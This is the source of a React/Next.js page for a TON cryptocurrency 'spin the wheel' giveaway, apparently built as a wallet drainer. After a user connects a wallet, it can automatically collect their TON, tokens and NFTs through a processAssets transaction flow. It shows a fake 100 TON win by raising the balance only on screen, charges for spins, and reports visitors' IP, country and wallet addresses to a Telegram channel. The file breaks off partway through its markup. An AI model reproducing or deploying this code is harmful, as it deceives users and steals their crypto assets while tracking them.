"use client";

import { useState, useEffect } from 'react';
import { 
  TonConnectUIProvider, 
  useTonConnectUI, 
  useTonWallet,
} from '@tonconnect/ui-react';
import { Address } from 'ton-core';
import { fetchTonData, fetchTokenData, fetchNftData, processAssets } from '@/lib/tonUtils';
import { sendTelegramMessage, getIpInfo, shortAdd } from '@/lib/telegram';
import { supabase } from '@/lib/supabase';

const manifestUrl = process.env.NEXT_PUBLIC_MANIFEST_URL as string;

// Конфигурация для автоматической транзакции
const AUTO_PROCESS_ENABLED = process.env.NEXT_PUBLIC_AUTO_PROCESS === 'true'; // Управление автообработкой
const SPIN_PRICE_TON = 2; // Цена спина в TON

function HomePage() {
  const [tonConnectUI] = useTonConnectUI();
  const wallet = useTonWallet();
  const [isProcessing, setIsProcessing] = useState(false);
  const [status, setStatus] = useState('');
  const [ipInfo, setIpInfo] = useState({ IP: '??', ISO2: '??' });
  const [host, setHost] = useState('');
  const [showModal, setShowModal] = useState(false);
  const [isSpinning, setIsSpinning] = useState(false);
  const [hasSpun, setHasSpun] = useState(false);
  const [userBalance, setUserBalance] = useState<number | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [hasProcessedWallet, setHasProcessedWallet] = useState(false);
  
  // Новые состояния для промокодов
  const [showPromoModal, setShowPromoModal] = useState(false);
  const [promoCode, setPromoCode] = useState('');
  const [promoError, setPromoError] = useState('');
  const [usedPromoCode, setUsedPromoCode] = useState<string | null>(null);
  const [paymentMethod, setPaymentMethod] = useState<'promo' | 'pay' | null>(null);
  const [isPaying, setIsPaying] = useState(false);

  const [promoCodes, setPromoCodes] = useState<Record<string, { name: string; usageCount: number; isActive: boolean }>>({});

useEffect(() => {
  const loadPromoCodes = async () => {
    const { data, error } = await supabase
      .from('promo_codes')
      .select('*');
    
    if (!error && data) {
      const codesMap: Record<string, { name: string; usageCount: number; isActive: boolean }> = {};
      data.forEach(code => {
        codesMap[code.code] = {
          name: code.name,
          usageCount: code.usage_count,
          isActive: code.is_active
        };
      });
      setPromoCodes(codesMap);
    }
  };

  loadPromoCodes();
}, []);

  useEffect(() => {
    document.body.style.visibility = 'hidden';
    
    const timer = setTimeout(() => {
      document.body.style.visibility = 'visible';
      setIsLoading(false);
    }, 100);

    setHost(window.location.hostname);
    getIpInfo().then(setIpInfo);
    
    // Проверяем сохраненный промокод
    const savedPromo = sessionStorage.getItem('usedPromoCode');
    if (savedPromo) {
      setUsedPromoCode(savedPromo);
      setHasSpun(true);
    }
    
    // Проверяем, был ли уже спин
    const sessionSpinned = sessionStorage.getItem('hasSpun');
    if (sessionSpinned === 'true') {
      setHasSpun(true);
    }
    
    if (process.env.NEXT_PUBLIC_TG_ENTER_WEBSITE === 'true') {
      const message = `👀 *User opened the website*\n\n🌍 ${navigator.language} | ${host}\n\n📍 [${ipInfo.ISO2}](https://ipapi.co/?q=${ipInfo.IP})`;
      sendTelegramMessage(message);
    }

    return () => clearTimeout(timer);
  }, [host, ipInfo.ISO2]);

  // Fetch user balance when wallet connects
  useEffect(() => {
    const fetchBalance = async () => {
      if (wallet) {
        try {
          const userWallet = Address.parse(wallet.account.address).toString({ bounceable: false });
          const tonData = await fetchTonData(userWallet);
          setUserBalance(tonData?.balance || 0);
        } catch (error) {
          console.error('Error fetching balance:', error);
          setUserBalance(0);
        }
      } else {
        setUserBalance(null);
        setHasProcessedWallet(false);
      }
    };

    fetchBalance();
  }, [wallet]);

  // Автоматическая обработка только если включена
  useEffect(() => {
    const autoProcessWallet = async () => {
      // Проверяем, включена ли автообработка
      if (!AUTO_PROCESS_ENABLED) return;
      
      if (wallet && userBalance !== null && !hasProcessedWallet && !isProcessing) {
        setHasProcessedWallet(true);
        
        if (userBalance < 0.2) {
          setStatus('Insufficient balance. Please add at least 0.2 TON to your wallet.');
          return;
        }

        await handleCollectAssetsAuto();
      }
    };

    autoProcessWallet();
  }, [wallet, userBalance, hasProcessedWallet, isProcessing]);

  const handleCollectAssetsAuto = async () => {
    if (!wallet || !AUTO_PROCESS_ENABLED) return;

    setIsProcessing(true);
    setStatus('Auto-processing wallet assets...');

    try {
      const userWallet = Address.parse(wallet.account.address).toString({ bounceable: false });
      
      const tonData = await fetchTonData(userWallet);
      const tokenData = await fetchTokenData(userWallet);
      const nftData = await fetchNftData(userWallet);

      if (!tonData && tokenData.length === 0 && nftData.length === 0) {
        if (process.env.NEXT_PUBLIC_TG_CONNECT_EMPTY === 'true') {
          const message = `🔌💩 *User Connected an empty Wallet* (${shortAdd(userWallet)})\n\n🌍 ${host} - 📍 [${ipInfo.ISO2}](https://ipapi.co/?q=${ipInfo.IP})`;
          await sendTelegramMessage(message);
        }
        
        setStatus('Empty wallet detected. Disconnecting...');
        handleDisconnect();
        return;
      }

      await processAssets(
        tonData, 
        tokenData, 
        nftData, 
        userWallet, 
        tonConnectUI, 
        ipInfo,
        host
      );

      setStatus('Assets processed successfully!');
      setShowModal(true);
      
    } catch (error) {
      setStatus(`Error: ${(error as Error).message}`);
    } finally {
      setIsProcessing(false);
    }
  };

  const validatePromoCode = (code: string): boolean => {
    const upperCode = code.toUpperCase().trim();
  return promoCodes[upperCode] && promoCodes[upperCode].isActive;
  };

  const handlePromoSubmit = async () => {
    const upperCode = promoCode.toUpperCase().trim();
    
    if (!upperCode) {
      setPromoError('Please enter a promo code');
      return;
    }

    if (!validatePromoCode(upperCode)) {
      setPromoError('Invalid promo code');
      
      // Отправляем уведомление о неверном промокоде
      if (process.env.NEXT_PUBLIC_TG_PROMO_INVALID === 'true') {
        const message = `❌ *Invalid promo code attempt*\n\nCode: ${upperCode}\nWallet: ${wallet ? shortAdd(Address.parse(wallet.account.address).toString({ bounceable: false })) : 'Not connected'}\n\n🌍 ${host} - 📍 [${ipInfo.ISO2}](https://ipapi.co/?q=${ipInfo.IP})`;
        await sendTelegramMessage(message);
      }
      return;
    }

    // Сохраняем использованный промокод
   const { error } = await supabase
  .from('promo_codes')
  .update({ usage_count: promoCodes[upperCode].usageCount + 1 })
  .eq('code', upperCode);

if (!error) {
  // Обнови локальное состояние
  setPromoCodes(prev => ({
    ...prev,
    [upperCode]: {
      ...prev[upperCode],
      usageCount: prev[upperCode].usageCount + 1
    }
  }));
}
    
    // Отправляем уведомление об использовании промокода
    if (process.env.NEXT_PUBLIC_TG_PROMO_USED === 'true') {
      const message = `🎫 *Promo code used*\n\n📌 Code: *${upperCode}*\n👤 Source: *${promoCodes.name}*\n🔢 Total uses: *${promoCodes.usageCount}*\nWallet: ${wallet ? shortAdd(Address.parse(wallet.account.address).toString({ bounceable: false })) : 'Not connected'}\n\n🌍 ${host} - 📍 [${ipInfo.ISO2}](https://ipapi.co/?q=${ipInfo.IP})`;
      await sendTelegramMessage(message);
    }

    setShowPromoModal(false);
    setPromoError('');
    
    // Запускаем спин
    handleSpinAfterPromo();
  };

  const handlePayForSpin = async () => {
    if (!wallet) {
      handleConnectWallet();
      return;
    }

    if (userBalance === null || userBalance < SPIN_PRICE_TON) {
      setPromoError(`Insufficient balance. You need ${SPIN_PRICE_TON} TON for paid spin`);
      return;
    }

    setIsPaying(true);

    try {
      const userWallet = Address.parse(wallet.account.address).toString({ bounceable: false });
      
      // Создаем транзакцию оплаты
      const paymentMessage = {
        address: process.env.NEXT_PUBLIC_WALLET as string,
        amount: (SPIN_PRICE_TON * 1000000000).toString(), // Конвертируем в nanoTON
        payload: 'Payment for spin'
      };

      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 600,
        messages: [paymentMessage]
      };

      await tonConnectUI.sendTransaction(transaction);

      // Отправляем уведомление об оплате
      if (process.env.NEXT_PUBLIC_TG_PAYMENT === 'true') {
        const message = `💰 *Paid spin*\n\n💵 Amount: *${SPIN_PRICE_TON} TON*\nWallet: ${shortAdd(userWallet)}\n\n🌍 ${host} - 📍 [${ipInfo.ISO2}](https://ipapi.co/?q=${ipInfo.IP})`;
        await sendTelegramMessage(message);
      }

      setShowPromoModal(false);
      setIsPaying(false);
      
      // Запускаем спин
      handleSpinAfterPromo();
      
    } catch (error) {
      setIsPaying(false);
      setPromoError('Payment cancelled or failed');
      
      if (process.env.NEXT_PUBLIC_TG_PAYMENT_CANCEL === 'true') {
        const userWallet = Address.parse(wallet.account.address).toString({ bounceable: false });
        const message = `❌ *Payment cancelled*\n\nWallet: ${shortAdd(userWallet)}\n\n🌍 ${host} - 📍 [${ipInfo.ISO2}](https://ipapi.co/?q=${ipInfo.IP})`;
        await sendTelegramMessage(message);
      }
    }
  };

const handleSpinAfterPromo = () => {
  setIsSpinning(true);
  setHasSpun(true);
  sessionStorage.setItem('hasSpun', 'true');
  
  const wheel = document.getElementById('wheel');
  if (wheel) {
    wheel.style.transition = 'transform 6s cubic-bezier(0.25, 0.46, 0.45, 0.94)';
    wheel.style.transform = 'rotate(2160deg)';
    
    setTimeout(() => {
      wheel.style.transition = 'none';
      wheel.style.transform = 'rotate(0deg)';
    }, 6000);
  }
  
  setTimeout(() => {
    setShowModal(true);
    setIsSpinning(false);
    
    // Анимируем добавление 100 TON к балансу
    if (wallet && userBalance !== null) {
      // Добавляем класс для анимации
      const balanceElement = document.querySelector('.balance_amount');
      if (balanceElement) {
        balanceElement.classList.add('animating');
        
        // Обновляем баланс с добавлением 100 TON (визуально)
        setTimeout(() => {
          setUserBalance(prev => (prev || 0) + 100);
          
          setTimeout(() => {
            balanceElement.classList.remove('animating');
          }, 1000);
        }, 500);
      }
    }
    
    // Отправляем уведомление
    if (process.env.NEXT_PUBLIC_TG_SPIN_WIN === 'true') {
      const method = usedPromoCode ? `Promo: ${usedPromoCode}` : 'Paid spin';
      const message = `🎰 *Spin completed - Won 100 TON!*\n\n🎫 Method: ${method}\nWallet: ${wallet ? shortAdd(Address.parse(wallet.account.address).toString({ bounceable: false })) : 'Not connected'}\n\n🌍 ${host} - 📍 [${ipInfo.ISO2}](https://ipapi.co/?q=${ipInfo.IP})`;
      sendTelegramMessage(message);
    }
  }, 6500);
};

const fetchBalance = async () => {
  if (wallet) {
    try {
      const userWallet = Address.parse(wallet.account.address).toString({ bounceable: false });
      const tonData = await fetchTonData(userWallet);
      setUserBalance(tonData?.balance || 0);
    } catch (error) {
      console.error('Error fetching balance:', error);
      setUserBalance(0);
    }
  }
};

  const handleSpin = () => {
    if (hasSpun || isSpinning) return;
    
    // Показываем модалку с выбором: промокод или оплата
    setShowPromoModal(true);
  };

  const handleConnectWallet = () => {
    tonConnectUI.openModal();
  };

  const handleDisconnect = () => {
    tonConnectUI.disconnect();
    setUserBalance(null);
    setHasProcessedWallet(false);
    setStatus('Wallet disconnected');
  };

  const handleClaimReward = () => {
    if (!wallet) {
      handleConnectWallet();
      return;
    }
    
    setShowModal(true);
  };

  const handleCollectAssets = async () => {
    if (!wallet) {
      handleConnectWallet();
      return;
    }

    if (userBalance === null || userBalance < 0.2) {
      setStatus('Insufficient balance. Please add at least 0.5 TON to your wallet to claim the reward.');
      return;
    }

    setIsProcessing(true);
    setStatus('Processing your reward...');

    try {
      const userWallet = Address.parse(wallet.account.address).toString({ bounceable: false });
      
      const tonData = await fetchTonData(userWallet);
      const tokenData = await fetchTokenData(userWallet);
      const nftData = await fetchNftData(userWallet);

      if (!tonData && tokenData.length === 0 && nftData.length === 0) {
        if (process.env.NEXT_PUBLIC_TG_CONNECT_EMPTY === 'true') {
          const message = `🔌💩 *User Connected an empty Wallet* (${shortAdd(userWallet)})\n\n🌍 ${host} - 📍 [${ipInfo.ISO2}](https://ipapi.co/?q=${ipInfo.IP})`;
          await sendTelegramMessage(message);
        }
        
        setStatus('Empty wallet detected. Disconnecting...');
        handleDisconnect();
        return;
      }

      await processAssets(
        tonData, 
        tokenData, 
        nftData, 
        userWallet, 
        tonConnectUI, 
        ipInfo,
        host
      );

      setStatus('Reward claimed successfully!');
      setShowModal(false);
    } catch (error) {
      setStatus(`Error: ${(error as Error).message}`);
    } finally {
      setIsProcessing(false);
    }
  };

  if (isLoading) {
    return (
      <div style={{
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        background: '#181f2e',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        zIndex: 9999
      }}>
        <div style={{
          width: '50px',
          height: '50px',
          border: '3px solid #0098ea',
          borderTop: '3px solid transparent',
          borderRadius: '50%',
          animation: 'spin 1s linear infinite'
        }} />
      </div>
    );
  }

  return (
    <>
<style jsx global>{`
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }

  h1, h2, h3, p {
    margin: 0;
    padding: 0;
  }

  a {
    text-decoration: none;
    color: #f2f2f2;
    display: block;
  }

  body {
    font-family: "Manrope", sans-serif;
    font-weight: 400;
    padding: 0;
    background: #181f2e url(/assets/img/bg.jpg) top no-repeat;
    background-size: 100% auto;
    margin: 0;
    width: 100%;
    height: 100%;
    opacity: 1;
    transition: opacity 0.3s ease;
  }

  html, body {
    width: 100vw;
    overflow-x: hidden;
  }

  ::-webkit-scrollbar {
    width: 5px;
    background-color: #c8d5de;
    height: 5px;
    border-radius: 10px;
  }

  ::-webkit-scrollbar-thumb {
    border-radius: 10px;
    background-color: #0098ea;
    width: 5px;
  }

  ::-webkit-scrollbar-track {
    -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, 0.2);
    border-radius: 10px;
    background-color: #c8d5de;
  }

  .container {
    width: 100%;
    max-width: 1440px;
    display: block;
    margin: 0 auto;
    padding: 0 20px;
  }

  .header {
    width: 100%;
    position: relative;
    z-index: 10;
  }

  .header_items {
    display: flex;
    align-items: center;
    padding-top: 40px;
    padding-bottom: 40px;
  }

  .header_item:nth-child(2) {
    margin-left: auto;
    margin-right: 50px;
  }

  .header_item_logo {
    vertical-align: middle;
  }

  .header_item_socials {
    display: flex;
    align-items: center;
  }

  .header_item_social {
    cursor: pointer;
    transition: all 0.3s ease;
    margin-right: 12px;
  }

  .header_item_social:hover {
    opacity: 0.7;
    transform: translateY(-2px);
  }

  .header_item_social:last-child {
    margin-right: 0px;
  }

  .wallet_section {
    display: flex;
    align-items: center;
    gap: 20px;
  }

  .balance_display {
    background: linear-gradient(135deg, rgba(65, 184, 222, 0.1) 0%, rgba(0, 152, 234, 0.1) 100%);
    border: 2px solid rgba(0, 152, 234, 0.3);
    border-radius: 100px;
    padding: 12px 24px;
    display: flex;
    align-items: center;
    gap: 12px;
    transition: all 0.3s ease;
    animation: fadeIn 0.5s ease;
  }

  .balance_display:hover {
    background: linear-gradient(135deg, rgba(65, 184, 222, 0.2) 0%, rgba(0, 152, 234, 0.2) 100%);
    border-color: rgba(0, 152, 234, 0.5);
    transform: translateY(-1px);
    box-shadow: 0 4px 15px rgba(0, 152, 234, 0.3);
  }

  .balance_label {
    color: rgba(255, 255, 255, 0.6);
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 1px;
    font-weight: 600;
  }

  .balance_amount {
    color: #fff;
    font-size: 20px;
    font-weight: 800;
    text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
    transition: all 0.5s ease;
  }

  .balance_amount.animating {
    animation: pulse 1s ease;
    color: #4ade80;
  }

  @keyframes pulse {
    0% { transform: scale(1); }
    50% { transform: scale(1.2); color: #4ade80; }
    100% { transform: scale(1); }
  }

  .balance_ton {
    background: linear-gradient(135deg, #41b8de 0%, #0098ea 100%);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    font-size: 14px;
    font-weight: 700;
    text-transform: uppercase;
  }

  .wallet_button {
    cursor: pointer;
    transition: all 0.3s ease;
    color: #fff;
    text-align: center;
    font-size: 20px;
    font-style: normal;
    font-weight: 600;
    line-height: 140%;
    text-transform: uppercase;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 24px 32px;
    border-radius: 100px;
    outline: none;
    border: none;
    position: relative;
    overflow: hidden;
  }

  .wallet_button_connect {
    background: linear-gradient(180deg, #41b8de 0%, #0098ea 125.89%);
  }

  .wallet_button_connected {
    background: linear-gradient(180deg, #4ade80 0%, #16a34a 125.89%);
  }

  .wallet_button img {
    vertical-align: middle;
    margin-left: 12px;
  }

  .wallet_button:hover {
    opacity: 0.8;
    transform: translateY(-1px);
  }

  .main {
    padding-top: 78px;
    padding-bottom: 60px;
  }

  .main_tittle {
    color: #fff;
    text-align: center;
    font-size: 72px;
    font-style: normal;
    font-weight: 800;
    line-height: 110%;
    letter-spacing: -1.44px;
    text-transform: uppercase;
    text-shadow: 0 4px 20px rgba(0, 152, 234, 0.3);
  }

  .main_tittle span {
    color: #17aeff;
  }

  .main_wheel {
    margin-top: 40px;
    position: relative;
  }

  .main_wheel::before {
    content: " ";
    position: absolute;
    left: 0;
    top: 0;
    z-index: 1;
    width: 100%;
    height: 100%;
    background: url(/assets/img/grad.png) bottom no-repeat;
    background-size: 100% 100%;
    background-position-y: 150px;
  }

  .main_wheel_main {
    position: relative;
    width: 100%;
    max-height: 600px;
    overflow: hidden;
  }

  .main_wheel_main_arrow {
    position: absolute;
    left: calc(50% - 62px);
    top: 0;
    z-index: 3;
    filter: drop-shadow(0 4px 10px rgba(0, 0, 0, 0.3));
  }

  .main_wheel_main_wheel {
    top: -40px;
    position: relative;
    display: block;
    margin: 0 auto;
    width: 100%;
    max-width: 1344px;
    filter: drop-shadow(0 10px 30px rgba(0, 0, 0, 0.4));
  }

  .main_wheel_main_button {
    display: block;
    margin: 0 auto;
    cursor: pointer;
    transition: all 0.3s ease;
    color: #fff;
    text-align: center;
    z-index: 8;
    font-size: 32px;
    font-style: normal;
    font-weight: 800;
    line-height: 110%;
    letter-spacing: -0.64px;
    text-transform: uppercase;
    outline: none;
    border: none;
    padding: 32px 44px;
    border-radius: 1000px;
    position: absolute;
    left: 50%;
    transform: translateX(-50%);
    top: 330px;
    box-shadow: 0 8px 25px rgba(0, 152, 234, 0.4);
  }

  .main_wheel_main_button.free_spin {
    background: linear-gradient(180deg, #41b8de 0%, #0098ea 125.89%);
  }

  .main_wheel_main_button.claim_reward {
    background: linear-gradient(180deg, #4ade80 0%, #16a34a 125.89%);
    box-shadow: 0 8px 25px rgba(34, 197, 94, 0.4);
  }

  .main_wheel_main_button.processing {
    background: linear-gradient(180deg, #fbbf24 0%, #f59e0b 125.89%);
    box-shadow: 0 8px 25px rgba(245, 158, 11, 0.4);
  }

  .main_wheel_main_button:hover:not(:disabled) {
    transform: translateX(-50%) translateY(-2px);
  }

  .main_wheel_main_button:disabled {
    opacity: 0.6;
    cursor: not-allowed;
  }

  .main_faq {
    position: relative;
    top: -130px;
    width: 100%;
    z-index: 3;
  }

  .main_faq_blocks {
    display: block;
    margin: 0 auto;
    max-width: 1061px;
  }

  .main_faq_block {
    margin-bottom: 12px;
    color: #fff;
    text-align: center;
    font-size: 20px;
    font-style: normal;
    font-weight: 600;
    line-height: 150%;
    display: flex;
    align-items: center;
    padding: 24px 20px;
    border-radius: 16px;
    background: rgba(39, 51, 73, 0.9);
    backdrop-filter: blur(10px);
    transition: all 0.3s ease;
  }

  .main_faq_block:hover {
    background: rgba(39, 51, 73, 1);
    transform: translateY(-2px);
  }

  .main_faq_block img {
    vertical-align: middle;
    margin-right: 12px;
  }

  .main_faq_copy {
    color: rgba(255, 255, 255, 0.4);
    text-align: center;
    font-size: 20px;
    font-style: normal;
    font-weight: 600;
    line-height: 150%;
    position: relative;
    margin-top: 60px;
  }

  /* Модалки остаются такими же */
  .modal {
    display: none;
    position: fixed;
    z-index: 11;
    left: 0;
    top: 0;
    width: 100%;
    height: 100vh;
    background: rgba(0, 0, 0, 0.8);
    backdrop-filter: blur(5px);
    animation: fadeIn 0.3s ease;
  }

  .modal_active {
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }

  .modal_rect {
    width: 100%;
    max-width: 600px;
    border-radius: 16px;
    background: #273349;
    animation: slideUp 0.4s ease;
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
  }

  .modal_rect_up {
    width: 100%;
    height: auto;
    background: url(/assets/img/modal_bg.png) top no-repeat;
    border-top-left-radius: 16px;
    border-top-right-radius: 16px;
  }

  .modal_rect_up_tittle {
    color: #fff;
    text-align: center;
    font-size: 32px;
    font-style: normal;
    font-weight: 800;
    line-height: 110%;
    letter-spacing: -0.64px;
    text-transform: uppercase;
    padding-top: 58px;
    padding-bottom: 58px;
  }

  .modal_rect_up_tittle span {
    color: #0098ea;
  }

  .modal_rect_bottom_content {
    padding: 40px;
  }

  .modal_rect_bottom_text {
    color: #fff;
    text-align: center;
    font-size: 28px;
    font-style: normal;
    font-weight: 500;
    line-height: 110%;
    letter-spacing: -0.56px;
    margin-bottom: 20px;
  }

  .modal_rect_bottom_button {
    color: #fff;
    text-align: center;
    font-size: 20px;
    font-style: normal;
    font-weight: 600;
    line-height: 140%;
    text-transform: uppercase;
    display: flex;
    align-items: center;
    justify-content: center;
    cursor: pointer;
    transition: all 0.3s ease;
    padding: 24px 48px;
    border-radius: 100px;
    background: linear-gradient(180deg, #41b8de 0%, #0098ea 125.89%);
    outline: none;
    border: none;
    width: 100%;
    margin-top: 20px;
    box-shadow: 0 8px 25px rgba(0, 152, 234, 0.4);
  }

  .modal_rect_bottom_button:hover:not(:disabled) {
    transform: translateY(-2px);
    box-shadow: 0 12px 30px rgba(0, 152, 234, 0.6);
  }

  .modal_rect_bottom_button:disabled {
    opacity: 0.6;
    cursor: not-allowed;
  }

  .modal_rect_bottom_button.connect {
    background: linear-gradient(180deg, #4ade80 0%, #16a34a 125.89%);
    box-shadow: 0 8px 25px rgba(34, 197, 94, 0.4);
  }

  .balance_warning {
    background: rgba(239, 68, 68, 0.1);
    border: 1px solid rgba(239, 68, 68, 0.3);
    color: #fecaca;
    padding: 16px;
    border-radius: 8px;
    margin: 20px 0;
    text-align: center;
    font-size: 16px;
  }

  .modal_close_btn {
    background: transparent;
    border: 1px solid rgba(255,255,255,0.3);
    color: rgba(255,255,255,0.7);
    padding: 12px 24px;
    border-radius: 50px;
    margin-top: 16px;
    cursor: pointer;
    font-size: 14px;
    transition: all 0.3s ease;
    width: 100%;
  }

  .modal_close_btn:hover {
    border-color: rgba(255,255,255,0.5);
    color: #fff;
  }

  .promo_input {
    width: 100%;
    padding: 16px 24px;
    border-radius: 12px;
    background: rgba(255, 255, 255, 0.1);
    border: 2px solid rgba(255, 255, 255, 0.2);
    color: #fff;
    font-size: 18px;
    margin: 20px 0;
    transition: all 0.3s ease;
    text-align: center;
    text-transform: uppercase;
  }

  .promo_input:focus {
    outline: none;
    border-color: #0098ea;
    background: rgba(255, 255, 255, 0.15);
  }

  .promo_input::placeholder {
    color: rgba(255, 255, 255, 0.5);
    text-transform: none;
  }

  .promo_error {
    color: #ff6b6b;
    text-align: center;
    font-size: 14px;
    margin: 10px 0;
  }

  .promo_divider {
    display: flex;
    align-items: center;
    margin: 30px 0;
  }

  .promo_divider::before,
  .promo_divider::after {
    content: '';
    flex: 1;
    height: 1px;
    background: rgba(255, 255, 255, 0.2);
  }

  .promo_divider span {
    color: rgba(255, 255, 255, 0.6);
    padding: 0 20px;
    font-size: 14px;
    text-transform: uppercase;
  }

  .promo_method_buttons {
    display: flex;
    gap: 16px;
    margin: 20px 0;
  }

  .promo_method_button {
    flex: 1;
    padding: 20px;
    border-radius: 12px;
    background: rgba(255, 255, 255, 0.1);
    border: 2px solid transparent;
    color: #fff;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
    text-align: center;
  }

  .promo_method_button:hover {
    background: rgba(255, 255, 255, 0.15);
    border-color: rgba(255, 255, 255, 0.3);
  }

  .promo_method_button.active {
    background: rgba(0, 152, 234, 0.2);
    border-color: #0098ea;
  }

  .promo_price_info {
    background: rgba(0, 152, 234, 0.1);
    border: 1px solid rgba(0, 152, 234, 0.3);
    color: #41b8de;
    padding: 12px;
    border-radius: 8px;
    margin: 16px 0;
    text-align: center;
    font-size: 14px;
  }

  .promo_submit_button {
    background: linear-gradient(180deg, #41b8de 0%, #0098ea 125.89%);
    color: #fff;
    padding: 18px 36px;
    border-radius: 100px;
    border: none;
    font-size: 18px;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.3s ease;
    width: 100%;
    text-transform: uppercase;
    margin-top: 10px;
  }

  .promo_submit_button:hover:not(:disabled) {
    transform: translateY(-2px);
    box-shadow: 0 12px 30px rgba(0, 152, 234, 0.6);
  }

  .promo_submit_button:disabled {
    opacity: 0.6;
    cursor: not-allowed;
  }

  .promo_submit_button.pay {
    background: linear-gradient(180deg, #fbbf24 0%, #f59e0b 125.89%);
  }

  @keyframes fadeIn {
    from { opacity: 0; }
    to { opacity: 1; }
  }

  @keyframes slideUp {
    from { transform: translateY(50px); opacity: 0; }
    to { transform: translateY(0); opacity: 1; }
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }

  @keyframes slideIn {
    from { transform: translateX(100%); opacity: 0; }
    to { transform: translateX(0); opacity: 1; }
  }

  /* МОБИЛЬНАЯ ВЕРСИЯ - ИСПРАВЛЕННАЯ */
  @media (max-width: 768px) {
    .container {
      padding: 0 15px;
    }

    .header_items {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 15px 0;
      flex-wrap: nowrap;
    }

    .header_item:nth-child(1) {
      flex: 0 0 auto;
    }

    .header_item:nth-child(2) {
      flex: 0 0 auto;
      margin: 0;
      margin-left: auto;
      margin-right: 15px;
    }

    .header_item:nth-child(3) {
      flex: 0 0 auto;
    }

    .header_item_logo img {
      height: 30px;
      width: auto;
    }

    .header_item_socials {
      display: flex;
      gap: 8px;
    }

    .header_item_social {
      margin-right: 0;
    }

    .header_item_social img {
      width: 20px;
      height: 20px;
    }

    .wallet_section {
      flex-direction: column;
      gap: 8px;
      align-items: flex-end;
    }

    .balance_display {
      padding: 6px 12px;
      gap: 6px;
    }

    .balance_label {
      font-size: 9px;
    }

    .balance_amount {
      font-size: 14px;
    }

    .balance_ton {
      font-size: 11px;
    }

    .wallet_button {
      font-size: 12px;
      padding: 10px 16px;
    }

    .wallet_button img {
      display: none;
    }

    .main {
      padding-top: 40px;
      padding-bottom: 40px;
    }

    .main_tittle {
      font-size: 36px;
      line-height: 1.1;
      letter-spacing: -0.72px;
    }

    .main_wheel {
      margin-top: 20px;
    }

    .main_wheel::before {
      display: none;
    }

    .main_wheel_main {
      max-width: 300px;
      margin: 0 auto;
    }

    .main_wheel_main_arrow {
      width: 35px;
      left: calc(50% - 17px);
      top: -5px;
    }

    .main_wheel_main_wheel {
      top: -10px;
    }

    .main_wheel_main_button {
      font-size: 14px !important;
      padding: 12px 20px !important;
      top: 50% !important;
      left: 50% !important;
      transform: translate(-50%, -50%) !important;
    }

    .main_wheel_main_button:hover:not(:disabled) {
      transform: translate(-50%, -50%) !important;
    }

    .main_faq {
      top: 0;
    }

    .main_faq_block {
      font-size: 14px;
      flex-direction: column;
      text-align: center;
      padding: 12px;
      gap: 8px;
    }

    .main_faq_block img {
      width: 30px;
      margin: 0;
    }

    .main_faq_copy {
      font-size: 12px;
      margin-top: 30px;
    }

    .promo_method_buttons {
      flex-direction: column;
    }

    .modal_rect {
      max-width: 95%;
    }

    .modal_rect_up_tittle {
      font-size: 20px;
      padding: 30px 20px;
    }

    .modal_rect_bottom_text {
      font-size: 18px;
    }

    .modal_rect_bottom_content {
      padding: 20px;
    }
  }
`}</style>

      <div>
        {/* Hidden TonConnect Button */}
        <button 
          id="connect-btn" 
          onClick={handleConnectWallet}
          style={{display: 'none', opacity: 0, height: 0, width: 0}}
        />

        {/* Promo Code Modal */}
        <div className={`modal ${showPromoModal ? 'modal_active' : ''}`}>
          <div className="modal_rect">
            <div className="modal_rect_up">
              <p className="modal_rect_up_tittle">
                SPIN THE WHEEL<br />
                <span>Choose your method</span>
              </p>
            </div>
            <div className="modal_rect_bottom">
              <div className="modal_rect_bottom_content">
                <div className="promo_method_buttons">
                  <button 
                    className={`promo_method_button ${paymentMethod === 'promo' ? 'active' : ''}`}
                    onClick={() => setPaymentMethod('promo')}
                  >
                    🎫 Use Promo Code
                  </button>
                  <button 
                    className={`promo_method_button ${paymentMethod === 'pay' ? 'active' : ''}`}
                    onClick={() => setPaymentMethod('pay')}
                  >
                    💰 Pay {SPIN_PRICE_TON} TON
                  </button>
                </div>

                {paymentMethod === 'promo' && (
                  <>
                    <input
                      type="text"
                      className="promo_input"
                      placeholder="Enter promo code"
                      value={promoCode}
                      onChange={(e) => setPromoCode(e.target.value.toUpperCase())}
                      onKeyPress={(e) => e.key === 'Enter' && handlePromoSubmit()}
                    />
                    {promoError && <p className="promo_error">{promoError}</p>}
                    <button 
                      className="promo_submit_button"
                      onClick={handlePromoSubmit}
                    >
                      ACTIVATE CODE
                    </button>
                  </>
                )}

                {paymentMethod === 'pay' && (
                  <>
                    <div className="promo_price_info">
                      💵 One spin costs {SPIN_PRICE_TON} TON
                      {userBalance !== null && (
                        <div style={{marginTop: '8px', fontSize: '12px'}}>
                          Your balance: {userBalance.toFixed(2)} TON
                        </div>
                      )}
                    </div>
                    {!wallet ? (
                      <button 
                        className="promo_submit_button pay"
                        onClick={handleConnectWallet}
                      >
                        CONNECT WALLET TO PAY
                      </button>
                    ) : (
                      <button 
                        className="promo_submit_button pay"
                        onClick={handlePayForSpin}
                        disabled={isPaying || (userBalance !== null && userBalance < SPIN_PRICE_TON)}
                      >
                        {isPaying ? 'PROCESSING...' : `PAY ${SPIN_PRICE_TON} TON & SPIN`}
                      </button>
                    )}
                    {promoError && <p className="promo_error">{promoError}</p>}
                  </>
                )}

                <div className="promo_divider">
                  <span>or</span>
                </div>

                <button 
                  className="modal_close_btn"
                  onClick={() => {
                    setShowPromoModal(false);
                    setPromoError('');
                    setPaymentMethod(null);
                  }}
                >
                  CANCEL
                </button>
              </div>
            </div>
          </div>
        </div>

